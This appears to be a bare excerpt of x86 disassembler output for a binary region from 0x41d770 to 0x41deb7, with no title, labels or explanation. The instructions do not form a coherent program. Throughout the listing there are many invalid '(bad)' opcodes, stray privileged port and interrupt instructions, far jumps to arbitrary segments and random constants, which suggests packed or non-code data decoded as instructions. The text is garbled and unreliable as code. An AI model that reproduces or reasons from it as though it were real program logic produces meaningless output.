  41d770:	fnsave [edx+0x4ff793b2]
  41d776:	jbe    0x41d72a
  41d778:	das    
  41d779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d77a:	div    BYTE PTR [ebx]
  41d77c:	mov    DWORD PTR [edi+0x62],esp
  41d77f:	pushf  
  41d780:	sar    DWORD PTR [edx+0x3df08703],cl
  41d786:	mov    dl,al
  41d788:	jg     0x41d78b
  41d78a:	(bad)  
  41d78b:	sti    
  41d78c:	adc    BYTE PTR [edx-0x3f9fb2c7],dl
  41d792:	sbb    al,0xb4
  41d794:	call   0xea71c7b2
  41d799:	xchg   DWORD PTR [eax],edi
  41d79b:	aad    0x92
  41d79d:	fs mov al,0x87
  41d7a0:	(bad)  
  41d7a1:	fcomi  st,st(0)
  41d7a3:	cmp    DWORD PTR [ebx],edi
  41d7a5:	dec    esi
  41d7a6:	shl    DWORD PTR [edx],0xee
  41d7a9:	jno    0x41d827
  41d7ab:	pop    ecx
  41d7ac:	push   edx
  41d7ad:	test   BYTE PTR [ebp-0xc54d276],dh
  41d7b3:	cld    
  41d7b4:	and    edx,DWORD PTR [ecx-0x30f19d03]
  41d7ba:	popa   
  41d7bb:	jb     0x41d818
  41d7bd:	cdq    
  41d7be:	mov    es:0x599aca36,eax
  41d7c4:	mov    esp,0x2234416e
  41d7c9:	or     DWORD PTR [ecx-0x10],edx
  41d7cc:	out    dx,al
  41d7cd:	push   esp
  41d7ce:	adc    DWORD PTR [eax],ecx
  41d7d0:	adc    eax,0xa54ec2b1
  41d7d5:	cmp    al,0xee
  41d7d7:	cmc    
  41d7d8:	and    eax,DWORD PTR [edx]
  41d7da:	adc    BYTE PTR [ecx],ch
  41d7dc:	push   esp
  41d7dd:	cld    
  41d7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7df:	inc    esp
  41d7e0:	xchg   edi,eax
  41d7e1:	xchg   edx,eax
  41d7e2:	push   ecx
  41d7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e4:	imul   esi,DWORD PTR [ebp+0xaaad19d],0x98361230
  41d7ee:	xlat   BYTE PTR ds:[ebx]
  41d7ef:	and    ebx,DWORD PTR [edx-0x8]
  41d7f2:	jle    0x41d779
  41d7f4:	jge    0x41d7fc
  41d7f6:	aam    0xd9
  41d7f8:	mov    ds:0xface0574,eax
  41d7fd:	jb     0x41d7ae
  41d7ff:	push   ds
  41d800:	ret    
  41d801:	rol    DWORD PTR [edx],1
  41d803:	cdq    
  41d804:	jns    0x41d7b9
  41d806:	xchg   ecx,eax
  41d807:	push   esp
  41d808:	xor    al,0x8
  41d80a:	mov    ebp,0x32d75d81
  41d80f:	mov    BYTE PTR [edx],dl
  41d811:	idiv   BYTE PTR [edi+0x55]
  41d814:	add    eax,0x39e24ac6
  41d819:	mov    esp,0xe286647
  41d81e:	xor    eax,0x338a7d0
  41d823:	into   
  41d824:	mov    ebx,DWORD PTR [ebx-0x1fc2518c]
  41d82a:	jle    0x41d81a
  41d82c:	xor    DWORD PTR [eax-0x3b90e469],0x266a260d
  41d836:	jp     0x41d8a4
  41d838:	sar    BYTE PTR [ebp+0x2],cl
  41d83b:	rcr    BYTE PTR es:[ebp+0x0],1
  41d83f:	cdq    
  41d840:	add    eax,0x10b0285f
  41d845:	ss cli 
  41d847:	in     eax,dx
  41d848:	loope  0x41d820
  41d84a:	push   eax
  41d84b:	lock and esp,DWORD PTR [ebp-0x76d7bf88]
  41d852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d853:	dec    esi
  41d854:	lock js 0x41d87a
  41d857:	sahf   
  41d858:	pop    edx
  41d859:	outs   dx,BYTE PTR ds:[esi]
  41d85a:	ins    DWORD PTR es:[edi],dx
  41d85b:	into   
  41d85c:	(bad)  
  41d85d:	or     bl,BYTE PTR [edx]
  41d85f:	neg    ebx
  41d861:	pusha  
  41d862:	outs   dx,DWORD PTR ds:[esi]
  41d863:	sbb    DWORD PTR [edi-0x6b],esp
  41d866:	mov    edi,0xc5bb2a31
  41d86b:	mov    al,ds:0x7c6ef697
  41d870:	dec    ecx
  41d871:	arpl   WORD PTR [ecx+0x75],sp
  41d874:	nop
  41d875:	sbb    DWORD PTR [esi+0x469bf020],ecx
  41d87b:	rol    eax,0x89
  41d87e:	add    esp,edi
  41d880:	test   DWORD PTR [eax-0x4bfa581],ecx
  41d886:	fs repnz mov dl,0xee
  41d88a:	shl    BYTE PTR [eax],1
  41d88c:	jae    0x41d8e2
  41d88e:	shl    ebx,1
  41d890:	sub    esi,esi
  41d892:	shr    BYTE PTR ds:0xb2ca9d32,cl
  41d898:	loope  0x41d85c
  41d89a:	xchg   esi,eax
  41d89b:	mov    ds:0x1369902b,al
  41d8a0:	jle    0x41d8b9
  41d8a2:	xchg   ebp,eax
  41d8a3:	shr    DWORD PTR [ebx+0x5f],0x4f
  41d8a7:	stos   DWORD PTR es:[edi],eax
  41d8a8:	mov    cl,0x8b
  41d8aa:	push   edx
  41d8ab:	xchg   esp,eax
  41d8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ad:	cdq    
  41d8ae:	les    edx,FWORD PTR [eax]
  41d8b0:	push   edx
  41d8b1:	jo     0x41d8d6
  41d8b3:	lahf   
  41d8b4:	cwde   
  41d8b5:	out    dx,eax
  41d8b6:	arpl   WORD PTR [edi],bp
  41d8b8:	bound  edi,QWORD PTR [ebp-0x24]
  41d8bb:	shl    DWORD PTR [esi+0x425f810e],0x58
  41d8c2:	lods   eax,DWORD PTR ds:[esi]
  41d8c3:	mov    edi,?
  41d8c5:	jbe    0x41d8b4
  41d8c7:	pop    edx
  41d8c8:	aad    0x3
  41d8ca:	or     cl,BYTE PTR ds:0xd7eac197
  41d8d0:	inc    esi
  41d8d1:	scas   al,BYTE PTR es:[edi]
  41d8d2:	fs pop ds
  41d8d4:	es (bad) 
  41d8d6:	out    0x43,al
  41d8d8:	mov    bh,0xfd
  41d8da:	rcr    BYTE PTR [eax-0x1d0cd0ff],0x50
  41d8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e2:	cmp    dl,BYTE PTR [esi-0x7657680d]
  41d8e8:	ror    BYTE PTR [esp+esi*8],1
  41d8eb:	rcl    DWORD PTR [edx+0x7d85ffe8],1
  41d8f1:	dec    esi
  41d8f2:	rcr    DWORD PTR [edx-0x78],1
  41d8f5:	and    BYTE PTR [eax-0x7c],0xaa
  41d8f9:	dec    ebx
  41d8fa:	std    
  41d8fb:	xchg   edi,eax
  41d8fc:	cmc    
  41d8fd:	rol    DWORD PTR [edi+0x57ee8623],0x1c
  41d904:	push   esi
  41d905:	ror    BYTE PTR [ebp+ecx*1+0x304200f],1
  41d90c:	jmp    0x41d94e
  41d90e:	jo     0x41d8a0
  41d910:	sbb    al,0xed
  41d912:	into   
  41d913:	lds    ecx,FWORD PTR [edx]
  41d915:	and    al,0xb
  41d917:	call   0x501ea99b
  41d91c:	ins    DWORD PTR es:[edi],dx
  41d91d:	pusha  
  41d91e:	dec    edx
  41d91f:	adc    al,0xe1
  41d921:	ficom  WORD PTR [ebx+edi*1]
  41d924:	and    dl,ah
  41d926:	pop    esp
  41d927:	jns    0x41d931
  41d929:	mov    cl,0x52
  41d92b:	loop   0x41d922
  41d92d:	xchg   esp,eax
  41d92e:	pop    es
  41d92f:	out    0x67,eax
  41d931:	mov    ebx,0x8b5aa119
  41d936:	ins    BYTE PTR es:[edi],dx
  41d937:	scas   al,BYTE PTR es:[edi]
  41d938:	test   eax,0xae817045
  41d93d:	mov    edi,ss
  41d93f:	std    
  41d940:	out    dx,al
  41d941:	leave  
  41d942:	ret    0x72e
  41d945:	jecxz  0x41d97e
  41d947:	pop    eax
  41d948:	sar    edx,1
  41d94a:	inc    esi
  41d94b:	outs   dx,DWORD PTR ds:[esi]
  41d94c:	add    eax,esp
  41d94e:	clc    
  41d94f:	push   ebp
  41d950:	stc    
  41d951:	ficom  WORD PTR [ebx+0x5cc3977a]
  41d957:	ins    BYTE PTR es:[edi],dx
  41d958:	fwait
  41d959:	sbb    ebp,esp
  41d95b:	add    DWORD PTR [ebp-0x4e7c5065],ebx
  41d961:	out    dx,eax
  41d962:	jno    0x41d93d
  41d964:	rcr    BYTE PTR [ebx+ecx*1-0x47],1
  41d968:	mov    ds:0x520ba58e,eax
  41d96d:	dec    ecx
  41d96e:	(bad)  
  41d96f:	test   ebp,0xa19fe004
  41d975:	xchg   BYTE PTR [ecx],bl
  41d977:	add    eax,0xeeff37c4
  41d97c:	mov    cl,BYTE PTR [edi+0x5a540e9a]
  41d982:	fdiv   st,st(2)
  41d984:	inc    esp
  41d985:	pushf  
  41d986:	daa    
  41d987:	cmp    ch,bh
  41d989:	sub    al,0xee
  41d98b:	mov    edx,0x337b6a18
  41d990:	pusha  
  41d991:	and    al,0x79
  41d993:	mov    cl,0xda
  41d995:	push   esp
  41d996:	cld    
  41d997:	mov    ebp,0xa07d410f
  41d99c:	popf   
  41d99d:	adc    ecx,DWORD PTR [edi+edi*1-0x7a]
  41d9a1:	xlat   BYTE PTR ds:[ebx]
  41d9a2:	in     al,0x61
  41d9a4:	aaa    
  41d9a5:	jp     0x41d99a
  41d9a7:	cdq    
  41d9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a9:	xor    BYTE PTR [edi],cl
  41d9ab:	mov    esi,0x66cf8584
  41d9b0:	jmp    0xf46:0x1e1e3af5
  41d9b7:	cli    
  41d9b8:	xor    DWORD PTR [edx-0x17],esp
  41d9bb:	and    al,0xed
  41d9bd:	rcl    BYTE PTR [ecx+0x3a7a3c84],1
  41d9c3:	jge    0x41d9a3
  41d9c5:	adc    al,0xa
  41d9c7:	loopne 0x41da22
  41d9c9:	cmp    bl,0x45
  41d9cc:	ins    DWORD PTR es:[edi],dx
  41d9cd:	mov    bl,0xd3
  41d9cf:	adc    DWORD PTR [ecx+esi*2-0x30fdc02e],0x6e4c9869
  41d9da:	std    
  41d9db:	mov    dl,bl
  41d9dd:	mov    dh,0x92
  41d9df:	lods   al,BYTE PTR ds:[esi]
  41d9e0:	std    
  41d9e1:	pop    eax
  41d9e2:	push   0xffffffa0
  41d9e4:	rcr    ebp,cl
  41d9e6:	ss dec edi
  41d9e8:	inc    ebp
  41d9e9:	jbe    0x41da17
  41d9eb:	test   al,0xd5
  41d9ed:	popa   
  41d9ee:	pop    ss
  41d9ef:	mov    dh,0x7b
  41d9f1:	jo     0x41da05
  41d9f3:	gs push cs
  41d9f5:	es (bad) 
  41d9f8:	pop    edi
  41d9f9:	mov    ah,0x24
  41d9fb:	sub    al,0x8f
  41d9fd:	mov    DWORD PTR [edx+edi*4+0x2f],esi
  41da01:	pop    ss
  41da02:	push   cs
  41da03:	gs xchg edx,eax
  41da05:	or     esi,DWORD PTR [bp+di+0x235d]
  41da0a:	xlat   BYTE PTR ds:[ebx]
  41da0b:	loopne 0x41da2b
  41da0d:	(bad)  
  41da0e:	ins    BYTE PTR es:[edi],dx
  41da0f:	and    edi,DWORD PTR [ebx+ebx*8+0x1f]
  41da13:	fisub  DWORD PTR [edi-0x5c]
  41da16:	dec    ebx
  41da17:	pusha  
  41da18:	fstp   TBYTE PTR [ecx-0xb192970]
  41da1e:	ficom  WORD PTR [edx+0x34]
  41da21:	outs   dx,BYTE PTR ds:[esi]
  41da22:	mov    eax,0x45459df8
  41da27:	adc    bl,dh
  41da29:	(bad)  
  41da2a:	pop    ebx
  41da2b:	in     eax,dx
  41da2c:	sbb    BYTE PTR [eax+0x2eec38ee],ch
  41da32:	xor    DWORD PTR [eax],ecx
  41da34:	rcr    ecx,1
  41da36:	mov    ebx,0x2db5c60b
  41da3b:	inc    eax
  41da3c:	inc    edx
  41da3d:	cmp    ch,BYTE PTR [edi+ebx*2+0x31]
  41da41:	rcr    bh,0xcc
  41da44:	or     ch,BYTE PTR [ebx]
  41da46:	data16 sar BYTE PTR [edi],1
  41da49:	sbb    BYTE PTR [ecx],al
  41da4b:	mov    al,0xeb
  41da4d:	adc    ch,bl
  41da4f:	out    0xc9,eax
  41da51:	scas   eax,DWORD PTR es:[edi]
  41da52:	dec    edi
  41da53:	mov    ecx,0x7acb1d86
  41da58:	push   edx
  41da59:	inc    edx
  41da5a:	push   edi
  41da5b:	add    ecx,DWORD PTR [edi]
  41da5d:	or     ebp,DWORD PTR [eax+eiz*1-0x1c]
  41da61:	sub    eax,0x464dd9ee
  41da66:	mov    edx,0x307d8e7f
  41da6b:	add    esi,DWORD PTR [esi]
  41da6d:	cwde   
  41da6e:	inc    ebx
  41da6f:	mov    edi,0x6f861dd4
  41da74:	xchg   ebx,eax
  41da75:	fcomp  DWORD PTR [esi+0x21]
  41da78:	xchg   ebx,eax
  41da79:	es je  0x41da8d
  41da7c:	jle    0x41da92
  41da7e:	ja     0x41da03
  41da80:	outs   dx,DWORD PTR ds:[esi]
  41da81:	add    ch,bl
  41da83:	cli    
  41da84:	push   edi
  41da85:	xchg   esi,eax
  41da86:	pop    esi
  41da87:	pop    esp
  41da88:	inc    esi
  41da89:	int    0x45
  41da8b:	or     DWORD PTR [ebp-0x24cb3ef1],edx
  41da91:	xlat   BYTE PTR ds:[ebx]
  41da92:	pop    esi
  41da93:	out    0x2b,eax
  41da95:	xchg   edx,eax
  41da96:	add    eax,0xbc965647
  41da9b:	retf   0x2626
  41da9e:	cmp    al,0x81
  41daa0:	mov    DWORD PTR [edi],ecx
  41daa2:	mov    esp,0xb55f5c8f
  41daa7:	push   ds
  41daa8:	xchg   edi,eax
  41daa9:	(bad)  [eax]
  41daab:	lea    edi,[eax-0x6b]
  41daae:	std    
  41daaf:	fwait
  41dab0:	pop    edi
  41dab1:	ficomp WORD PTR [edi]
  41dab3:	mov    eax,0x77400ad6
  41dab8:	leave  
  41dab9:	xchg   ecx,eax
  41daba:	jmp    0x1229488c
  41dabf:	test   BYTE PTR [edx+eax*2],cl
  41dac2:	enter  0x510a,0x36
  41dac6:	in     eax,0xe8
  41dac8:	pop    edi
  41dac9:	jnp    0x41db03
  41dacb:	gs push 0xfec63f87
  41dad1:	ret    0x2841
  41dad4:	(bad)  
  41dad5:	sar    esi,cl
  41dad7:	adc    DWORD PTR [ebx-0x4a],ebp
  41dada:	ror    BYTE PTR [edx+0x4f715e93],0xea
  41dae1:	or     al,0xe0
  41dae3:	xchg   ecx,eax
  41dae4:	cdq    
  41dae5:	xchg   edi,eax
  41dae6:	test   eax,0x245824
  41daeb:	repz cmp al,BYTE PTR [ebx]
  41daee:	pop    ss
  41daef:	sahf   
  41daf0:	cmp    edx,eax
  41daf2:	jnp    0x41db3b
  41daf4:	jo     0x41dabd
  41daf6:	stos   DWORD PTR es:[edi],eax
  41daf7:	mov    ebp,0x96ff914d
  41dafc:	outs   dx,BYTE PTR ds:[esi]
  41dafd:	inc    esi
  41dafe:	add    bh,cl
  41db00:	mov    dh,0x5e
  41db02:	mov    BYTE PTR [esi-0x14],0xc0
  41db06:	or     bl,BYTE PTR [ebp+0x70]
  41db09:	(bad)  
  41db0a:	sub    DWORD PTR ds:0x7ce94680,esp
  41db10:	inc    ebx
  41db11:	loope  0x41db79
  41db13:	inc    ebx
  41db14:	push   edi
  41db15:	sub    DWORD PTR [eax-0x4b],ecx
  41db18:	jge    0x41db2b
  41db1a:	pop    eax
  41db1b:	cwde   
  41db1c:	xor    BYTE PTR [edx+0x644e5d64],dh
  41db22:	jmp    0x41db27
  41db24:	ss cwde 
  41db26:	gs pop ss
  41db28:	arpl   WORD PTR [ebp-0x2e],dx
  41db2b:	(bad)  
  41db2d:	and    eax,0x78ac0781
  41db32:	dec    edx
  41db33:	mov    BYTE PTR [edi+0x7a],dh
  41db36:	imul   edx,DWORD PTR [ecx-0x1c5beede],0xffffffc0
  41db3d:	mov    ecx,0xdab47fdf
  41db42:	sub    al,0x42
  41db44:	in     al,dx
  41db45:	cmp    al,0xad
  41db47:	das    
  41db48:	push   ss
  41db49:	dec    esp
  41db4a:	loop   0x41db47
  41db4c:	adc    edx,edi
  41db4e:	in     al,0x23
  41db50:	lods   eax,DWORD PTR ds:[esi]
  41db51:	or     BYTE PTR [esi+0x2a],cl
  41db54:	jle    0x41dadf
  41db56:	cli    
  41db57:	jle    0x41daec
  41db59:	in     eax,0x9c
  41db5b:	jecxz  0x41db6a
  41db5d:	sbb    al,0x5b
  41db5f:	test   bh,bl
  41db61:	gs leave 
  41db63:	mov    ah,BYTE PTR ds:0x3983e2e2
  41db69:	lods   al,BYTE PTR ds:[esi]
  41db6a:	adc    DWORD PTR [eax-0x4b],esi
  41db6d:	scas   eax,DWORD PTR es:[edi]
  41db6e:	arpl   WORD PTR [esp+edx*1],cx
  41db71:	xor    BYTE PTR [ecx-0x33b154b],cl
  41db77:	mov    ebp,0x6b3e793e
  41db7c:	mov    ebp,0xed09734d
  41db81:	stc    
  41db82:	fld    DWORD PTR ds:0xd7e2b2b3
  41db88:	push   0xffffff9a
  41db8a:	lahf   
  41db8b:	popf   
  41db8c:	xchg   ebp,eax
  41db8d:	and    eax,0x9abc84a8
  41db92:	xor    al,0x62
  41db94:	pusha  
  41db95:	cwde   
  41db96:	inc    ebp
  41db97:	fidivr DWORD PTR [eax-0x3b56d4af]
  41db9d:	jo     0x41db75
  41db9f:	nop
  41dba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba1:	mov    cl,0x79
  41dba3:	imul   ebx,edx,0xffffffbf
  41dba6:	sbb    bl,ah
  41dba8:	fcomp  QWORD PTR [edi+0x56]
  41dbab:	mov    WORD PTR [ebp+0xd9ccd3b],es
  41dbb1:	pop    es
  41dbb2:	add    DWORD PTR [esi-0x2e962556],ebx
  41dbb8:	pop    ecx
  41dbb9:	pop    esi
  41dbba:	push   ebx
  41dbbb:	fsub   QWORD PTR [eax]
  41dbbd:	push   esi
  41dbbe:	imul   ebp,DWORD PTR [ebp+0x1f161723],0x1c
  41dbc5:	outs   dx,DWORD PTR ds:[esi]
  41dbc6:	sbb    DWORD PTR [eax],ecx
  41dbc8:	out    dx,eax
  41dbc9:	push   0xc5eb4460
  41dbce:	pop    edx
  41dbcf:	and    BYTE PTR [esi+0x6a1a4109],ch
  41dbd5:	inc    ecx
  41dbd6:	ja     0x41db7b
  41dbd8:	imul   eax,DWORD PTR [edi+ebp*8+0x2f7089f4],0x66d9d49
  41dbe3:	mov    ?,WORD PTR [edi]
  41dbe5:	pop    ds
  41dbe6:	lods   al,BYTE PTR ds:[esi]
  41dbe7:	jl     0x41dc31
  41dbe9:	sub    edi,eax
  41dbeb:	ret    0x86f6
  41dbee:	xor    BYTE PTR [ebx],cl
  41dbf0:	mov    esi,0x337ad8c8
  41dbf5:	add    ecx,ebx
  41dbf7:	stos   BYTE PTR es:[edi],al
  41dbf8:	jl     0x41dc01
  41dbfa:	sbb    edx,0xb286689c
  41dc00:	or     al,0x86
  41dc02:	adc    al,BYTE PTR [ecx+edi*4]
  41dc05:	mov    eax,0xb2ee5c30
  41dc0a:	xchg   ebp,eax
  41dc0b:	jbe    0x41dba8
  41dc0d:	xor    DWORD PTR [ebx-0x30],0xe2914f36
  41dc14:	or     ah,BYTE PTR [eax+0x3f4f3d60]
  41dc1a:	sub    ah,BYTE PTR ds:0x3d4c997f
  41dc20:	and    eax,0xba10b16d
  41dc25:	push   ebp
  41dc26:	mov    al,ss:0x3280d0fa
  41dc2c:	fneni(8087 only) 
  41dc2e:	xor    DWORD PTR [ecx+edi*1-0x24a860f6],eax
  41dc35:	pop    ds
  41dc36:	mov    ds:0xc17cd636,al
  41dc3b:	or     eax,0x950ac42e
  41dc40:	out    0x50,eax
  41dc42:	pop    eax
  41dc43:	xchg   DWORD PTR [edx],ebx
  41dc45:	push   ss
  41dc46:	mov    ds:0x3e47915c,eax
  41dc4b:	fs cs push 0x83192024
  41dc52:	or     ch,BYTE PTR [esi-0x38]
  41dc55:	push   ebp
  41dc56:	out    dx,eax
  41dc57:	mov    al,ds:0x99824f7e
  41dc5c:	xchg   ecx,eax
  41dc5d:	out    0xd3,al
  41dc5f:	push   ebp
  41dc60:	repz jns 0x41dc5d
  41dc63:	shl    dl,1
  41dc65:	push   ebx
  41dc66:	das    
  41dc67:	pop    edi
  41dc68:	dec    ebx
  41dc69:	sub    al,bh
  41dc6b:	inc    esp
  41dc6c:	push   es
  41dc6d:	es (bad) 
  41dc6f:	sti    
  41dc70:	imul   esp,eax,0x2
  41dc73:	adc    ah,dh
  41dc75:	sahf   
  41dc76:	push   edi
  41dc77:	xchg   ecx,eax
  41dc78:	ja     0x41dce8
  41dc7a:	cdq    
  41dc7b:	xchg   ecx,eax
  41dc7c:	sahf   
  41dc7d:	pop    eax
  41dc7e:	repz sub dl,ah
  41dc81:	cmp    DWORD PTR [edx+0x2c],ebp
  41dc84:	mov    edx,0x44a03fa7
  41dc89:	jmp    0x1b72:0x64cf15a3
  41dc90:	add    edi,DWORD PTR [ecx]
  41dc92:	sub    al,0x25
  41dc94:	xchg   esi,eax
  41dc95:	out    dx,al
  41dc96:	pop    ebp
  41dc97:	fmul   st,st(7)
  41dc99:	mov    ah,0x54
  41dc9b:	xchg   ecx,eax
  41dc9c:	dec    eax
  41dc9d:	enter  0x7837,0x2d
  41dca1:	pop    esp
  41dca2:	cld    
  41dca3:	arpl   WORD PTR [esp+ebp*1],di
  41dca6:	jl     0x41dc51
  41dca8:	ins    DWORD PTR es:[edi],dx
  41dca9:	push   ebp
  41dcaa:	mov    ecx,0x50c22b42
  41dcaf:	pop    ebp
  41dcb0:	inc    eax
  41dcb1:	jmp    0x41dc5e
  41dcb3:	ret    
  41dcb4:	mov    ebp,0x2ae5592e
  41dcb9:	test   al,0x3b
  41dcbb:	out    dx,eax
  41dcbc:	adc    edi,DWORD PTR [esp+edx*8-0x1]
  41dcc0:	fistp  WORD PTR [ecx-0x4cafef52]
  41dcc6:	lods   al,BYTE PTR ds:[esi]
  41dcc7:	stc    
  41dcc8:	imul   ebx,DWORD PTR [eax-0x9cc28ee],0xffffff8a
  41dccf:	add    DWORD PTR [ecx+0x3ecd182a],esp
  41dcd5:	(bad)  
  41dcd6:	adc    DWORD PTR [eax+0xd],edi
  41dcd9:	rcl    DWORD PTR [edx],cl
  41dcdb:	icebp  
  41dcdc:	lods   eax,DWORD PTR ds:[esi]
  41dcdd:	push   edx
  41dcde:	bound  ebp,QWORD PTR [ebp+edi*4+0x7f]
  41dce2:	pushf  
  41dce3:	into   
  41dce4:	in     eax,dx
  41dce5:	and    BYTE PTR [esi-0x6bd55796],bl
  41dceb:	and    esp,DWORD PTR ds:0xc7ad0e79
  41dcf1:	imul   esp,DWORD PTR [eax+ecx*4-0x41e67b4f],0x6b
  41dcf9:	nop
  41dcfa:	and    ah,BYTE PTR [ecx+0x76aecd29]
  41dd00:	into   
  41dd01:	push   cs
  41dd02:	adc    DWORD PTR [esi],0x38
  41dd05:	mov    ah,0x95
  41dd07:	jb     0x41dd2e
  41dd09:	xor    al,0x83
  41dd0b:	scas   al,BYTE PTR es:[edi]
  41dd0c:	mov    bh,ch
  41dd0e:	jl     0x41dd2d
  41dd10:	cld    
  41dd11:	pop    ds
  41dd12:	retf   
  41dd13:	mov    ah,0x6a
  41dd15:	ret    0xaab4
  41dd18:	sub    DWORD PTR [ebx],0x77
  41dd1b:	mov    es,WORD PTR [ecx]
  41dd1d:	out    0xc1,al
  41dd1f:	inc    esi
  41dd20:	aad    0xef
  41dd22:	arpl   WORD PTR [ebp+0x31],bp
  41dd25:	adc    edi,DWORD PTR [ebx-0x7509a205]
  41dd2b:	jl     0x41dd3b
  41dd2d:	pop    eax
  41dd2e:	jge    0x41dd1a
  41dd30:	arpl   ax,di
  41dd32:	push   eax
  41dd33:	inc    ecx
  41dd34:	jae    0x41dcd9
  41dd36:	xor    al,0x31
  41dd38:	mov    ch,0xd2
  41dd3a:	push   ebx
  41dd3b:	mov    ch,0x15
  41dd3d:	inc    ebp
  41dd3e:	cmc    
  41dd3f:	addr16 push ebx
  41dd41:	icebp  
  41dd42:	cld    
  41dd43:	dec    eax
  41dd44:	adc    eax,0xc5867734
  41dd49:	push   ebx
  41dd4a:	stc    
  41dd4b:	sub    eax,0x52146e25
  41dd50:	dec    esp
  41dd51:	(bad)  [ebx-0x2f]
  41dd54:	call   0xa7b:0xe9025127
  41dd5b:	push   cs
  41dd5c:	mov    bh,0x8a
  41dd5e:	popf   
  41dd5f:	jbe    0x41dd43
  41dd61:	push   esp
  41dd62:	xchg   ebp,eax
  41dd63:	or     eax,0x6fa83a66
  41dd68:	popa   
  41dd69:	cmp    BYTE PTR [edx],cl
  41dd6b:	lock stos BYTE PTR es:[edi],al
  41dd6d:	test   DWORD PTR [eax-0x59],esi
  41dd70:	pop    ecx
  41dd71:	adc    al,0x2a
  41dd73:	sbb    ecx,DWORD PTR [ebp+0x16]
  41dd76:	sbb    eax,0xe74592e7
  41dd7b:	push   es
  41dd7c:	call   0x7cefa211
  41dd81:	push   0x9d3ffc08
  41dd86:	in     al,dx
  41dd87:	loope  0x41dd7c
  41dd89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd8a:	fbld   TBYTE PTR [esi-0x2a2c09e4]
  41dd90:	sub    al,0x2a
  41dd92:	or     eax,0xd57f18fc
  41dd97:	jg     0x41ddbb
  41dd99:	das    
  41dd9a:	lds    ecx,FWORD PTR [edx-0x4a]
  41dd9d:	sub    bh,cl
  41dd9f:	xchg   esi,eax
  41dda0:	sub    al,BYTE PTR [ebx+0x2152e983]
  41dda6:	xlat   BYTE PTR ds:[ebx]
  41dda7:	pusha  
  41dda8:	pop    esp
  41dda9:	mov    dh,0x96
  41ddab:	cli    
  41ddac:	cli    
  41ddad:	sub    eax,0xcd40b0af
  41ddb2:	daa    
  41ddb3:	out    0xdd,eax
  41ddb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddb6:	clc    
  41ddb7:	inc    eax
  41ddb8:	jae    0x41dd9f
  41ddba:	inc    edx
  41ddbb:	xchg   edi,eax
  41ddbc:	jae    0x41dd98
  41ddbe:	jmp    0xea8d0fd3
  41ddc3:	push   edx
  41ddc4:	cli    
  41ddc5:	sub    ebx,DWORD PTR [edi-0x306063ca]
  41ddcb:	cmp    DWORD PTR [edx-0x73f0a81f],ecx
  41ddd1:	sbb    BYTE PTR [ecx],dl
  41ddd3:	adc    ch,bh
  41ddd5:	arpl   WORD PTR [edx-0x1a270da5],cx
  41dddb:	mov    ds:0x134cb6bf,eax
  41dde0:	repz xor ebx,DWORD PTR [edi]
  41dde3:	xchg   ebp,eax
  41dde4:	fsubp  st(3),st
  41dde6:	nop    esi
  41dde9:	pop    ebx
  41ddea:	mov    ebp,0x68f40333
  41ddef:	dec    ebx
  41ddf0:	mov    ch,0x5f
  41ddf2:	popf   
  41ddf3:	sbb    DWORD PTR [ebx],esi
  41ddf5:	or     eax,0xd8d04b06
  41ddfa:	dec    esi
  41ddfb:	lods   eax,DWORD PTR ds:[esi]
  41ddfc:	or     al,0x46
  41ddfe:	icebp  
  41ddff:	sbb    BYTE PTR [edi],dh
  41de01:	cwde   
  41de02:	jns    0x41de51
  41de04:	jp     0x41de5c
  41de06:	adc    DWORD PTR [eax-0x16f72446],eax
  41de0c:	data16 loopne 0x41de68
  41de0f:	adc    eax,ebx
  41de11:	dec    ecx
  41de12:	push   esi
  41de13:	push   ss
  41de14:	mov    esi,0xc99a2e53
  41de19:	aam    0xd0
  41de1b:	mov    eax,ds:0x6aee32d1
  41de20:	dec    esi
  41de21:	mov    edi,0xab27bffa
  41de26:	and    eax,0x34ee4666
  41de2b:	aam    0x64
  41de2d:	inc    edi
  41de2e:	inc    esi
  41de2f:	sbb    ebx,esi
  41de31:	add    al,0x89
  41de33:	push   esp
  41de34:	sbb    bh,dl
  41de36:	popa   
  41de37:	inc    esp
  41de38:	mov    ah,0x4c
  41de3a:	fidiv  DWORD PTR [ecx+0x26]
  41de3d:	push   edi
  41de3e:	and    ebx,esp
  41de40:	xchg   DWORD PTR ss:[ebx+0x5af667a6],edi
  41de47:	xchg   ebp,eax
  41de48:	sbb    al,0x22
  41de4a:	(bad)  
  41de4c:	pop    ebx
  41de4d:	mov    DWORD PTR [edx+0xbd99373],edi
  41de53:	inc    esp
  41de54:	xchg   ebp,eax
  41de55:	test   eax,0x2f89c0a6
  41de5a:	sbb    bh,BYTE PTR [ecx-0x1388b2a0]
  41de60:	sbb    esp,DWORD PTR ds:0x6ea640a2
  41de66:	sbb    al,0x14
  41de68:	jl     0x41decb
  41de6a:	mov    ds:0xf5329906,eax
  41de6f:	or     bh,BYTE PTR [edi]
  41de71:	fsub   DWORD PTR [edx]
  41de73:	int    0xe3
  41de75:	add    BYTE PTR [edi+0x6c],dh
  41de78:	lock cmp ch,BYTE PTR [ebx-0x67]
  41de7c:	inc    eax
  41de7d:	push   ss
  41de7e:	xchg   ebp,eax
  41de7f:	imul   edx,esi,0x72
  41de82:	sbb    eax,0x244c759e
  41de87:	nop
  41de88:	dec    esp
  41de89:	adc    eax,0xae2b0cd2
  41de8e:	mov    ah,0x2a
  41de90:	out    dx,al
  41de91:	or     al,0xc7
  41de93:	mov    bl,0xd2
  41de95:	mov    eax,0xfa2f001b
  41de9a:	mov    eax,ds:0x148642b8
  41de9f:	lock push ss
  41dea1:	push   ecx
  41dea2:	pop    edx
  41dea3:	sub    DWORD PTR [ebp+0x29e04992],ecx
  41dea9:	and    bl,BYTE PTR [edx]
  41deab:	sti    
  41deac:	adc    esi,ebx
  41deae:	add    edx,edi
  41deb0:	cmp    ah,ah
  41deb2:	enter  0x12cb,0x30
  41deb6:	fwait
  41deb7:	arpl   WORD PTR [ecx+0x2b],ax
